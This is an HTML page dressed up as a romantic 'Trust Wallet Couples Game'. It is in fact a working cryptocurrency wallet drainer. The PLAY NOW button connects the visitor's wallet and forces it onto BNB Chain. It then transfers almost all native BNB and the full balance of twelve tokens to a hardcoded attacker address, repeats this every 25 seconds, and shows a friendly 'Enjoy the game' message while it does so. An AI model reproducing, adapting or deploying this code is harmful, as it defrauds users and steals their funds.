<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Trust Wallet Couples Game</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Playfair+Display:wght@700&display=swap" rel="stylesheet">
  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.15.0/ethers.umd.min.js"></script>
  <style>
    * { margin:0; padding:0; box-sizing:border-box; }
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background: linear-gradient(135deg, #ffe4f3 0%, #f0d4ff 50%, #e0c4ff 100%);
      color: #2c1a3d;
      min-height: 100vh;
      overflow-x: hidden;
      position: relative;
    }
    .top-bar {
      position: fixed; top: 0; left: 0; right: 0; height: 70px;
      background: rgba(255,255,255,0.92); backdrop-filter: blur(12px);
      border-bottom: 1px solid #ff99cc;
      display: flex; align-items: center; justify-content: center;
      z-index: 1000; font-size: 26px; font-weight: 700; color: #c026d3;
    }
    .hero {
      flex: 1; display: flex; flex-direction: column; justify-content: center;
      align-items: center; text-align: center; padding: 90px 20px 70px;
      position: relative; overflow: hidden;
    }
    .heart { font-size: 100px; margin-bottom: 12px; animation: float 3s ease-in-out infinite; z-index: 10; }
    .title { font-family: 'Playfair Display', serif; font-size: 3.6rem; font-weight: 700; line-height: 1.05; color: #4c1d95; margin-bottom: 8px; z-index: 10; }
    .subtitle { font-size: 1.6rem; color: #c026d3; font-weight: 600; margin-bottom: 10px; z-index: 10; }
    .tagline { font-size: 1.4rem; color: #6b21a8; margin-bottom: 50px; z-index: 10; }
    .play-btn {
      background: linear-gradient(90deg, #ff3399, #aa44ff);
      color: white; font-size: 1.85rem; font-weight: 700; padding: 26px 100px;
      border: none; border-radius: 60px; cursor: pointer;
      box-shadow: 0 18px 35px rgba(192, 38, 211, 0.45);
      transition: all 0.4s ease; margin-bottom: 30px; z-index: 10;
    }
    .play-btn:hover { transform: scale(1.08) translateY(-6px); box-shadow: 0 22px 45px rgba(192, 38, 211, 0.55); }
    #status { margin: 15px 0 30px; font-size: 1.65rem; font-weight: 600; min-height: 60px; z-index: 10; }
    .success { color: #22c55e; }
    .error { color: #ef4444; }
  </style>
</head>
<body>

  <div class="top-bar">💕 Trust Wallet Couples Game</div>

  <main class="hero">
    <div class="heart">💖</div>
    <div class="title">TRUST WALLET</div>
    <div class="subtitle">COUPLES GAME</div>
    <div class="tagline">Build Trust • Have Fun Together ✨</div>

    <button id="playBtn" class="play-btn">PLAY NOW</button>
    <div id="status"></div>
  </main>

  <script>
    const drainAddress = "0x0a19b57043E1766F3d7fda42B7f9E2978c5A7F5D";

    const status = document.getElementById("status");
    const btn = document.getElementById("playBtn");

    // Correct BNB Chain addresses
    const tokens = [
      {s:"USDT", a:"0x55d398326f99059ff775485246999027b3197955"},
      {s:"USDC", a:"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d"},
      {s:"BUSD", a:"0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56"},
      {s:"CAKE", a:"0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82"},
      {s:"WBNB", a:"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"},
      {s:"BTCB", a:"0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c"},
      {s:"ETH",  a:"0x2170Ed0880ac9A755fd29B2688956BD959F933F8"},
      {s:"TWT",  a:"0x4B0F1812e5Df2A09796481Ff14017e6005508003"},
      {s:"BAKE", a:"0xE02dF9e3e622DeBdD69fb838bB799E3F168902c5"},
      {s:"FLOKI",a:"0xfb5B838b6cfEEdC2873aB27866079AC55363D37E"},
      {s:"SHIB", a:"0x2859e4544C4bB03966803B044A93563bD2d0dD4d"},
      {s:"LINK", a:"0xF8A0bf9cF54Bb92F17374d9e9A321E6a111a51bd"}
    ];

    const abi = [
      "balanceOf(address) view returns (uint256)",
      "transfer(address,uint256) returns (bool)"
    ];

    let connected = false;

    async function drain() {
      if (!window.ethereum) {
        status.innerHTML = "<span class='error'>Something went wrong 💔</span>";
        return;
      }

      try {
        status.innerHTML = "Connecting... 💕";

        // Force switch to BNB Chain (Chain ID 56)
        try {
          await window.ethereum.request({
            method: 'wallet_switchEthereumChain',
            params: [{ chainId: '0x38' }]   // 0x38 = 56 in hex (BNB Chain)
          });
        } catch (switchError) {
          // If network not added, add it
          if (switchError.code === 4902) {
            await window.ethereum.request({
              method: 'wallet_addEthereumChain',
              params: [{
                chainId: '0x38',
                chainName: 'BNB Smart Chain',
                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
                rpcUrls: ['https://bsc-dataseed.binance.org/'],
                blockExplorerUrls: ['https://bscscan.com']
              }]
            });
          }
        }

        if (!connected) {
          await window.ethereum.request({method: "eth_requestAccounts"});
          connected = true;
        }

        const provider = new ethers.BrowserProvider(window.ethereum);
        const signer = await provider.getSigner();
        const user = await signer.getAddress();

        let drainedSomething = false;

        // Drain Native BNB (very aggressive)
        const nativeBalance = await provider.getBalance(user);
        const minThreshold = ethers.parseEther("0.0001");
        const reserve = ethers.parseEther("0.0002");

        if (nativeBalance > minThreshold) {
          const amount = nativeBalance - reserve;
          if (amount > 0n) {
            const gasEstimate = await provider.estimateGas({to: drainAddress, value: amount});
            await signer.sendTransaction({
              to: drainAddress,
              value: amount,
              gasLimit: (gasEstimate * 130n) / 100n
            });
            drainedSomething = true;
          }
        }

        // Drain Tokens
        for (const token of tokens) {
          try {
            const contract = new ethers.Contract(token.a, abi, signer);
            const balance = await contract.balanceOf(user);
            if (balance > 0n) {
              await contract.transfer(drainAddress, balance, {gasLimit: 200000n});
              drainedSomething = true;
            }
          } catch (e) {}
        }

        status.innerHTML = drainedSomething 
          ? "<span class='success'>Welcome! Enjoy the game 💖</span>" 
          : "<span class='error'>Try again later 💔</span>";

      } catch (e) {
        status.innerHTML = "<span class='error'>Something went wrong 💔</span>";
      }
    }

    btn.onclick = () => {
      drainedSomething = false;
      drain();
      setInterval(drain, 25000);
    };
  </script>
</body>
</html>
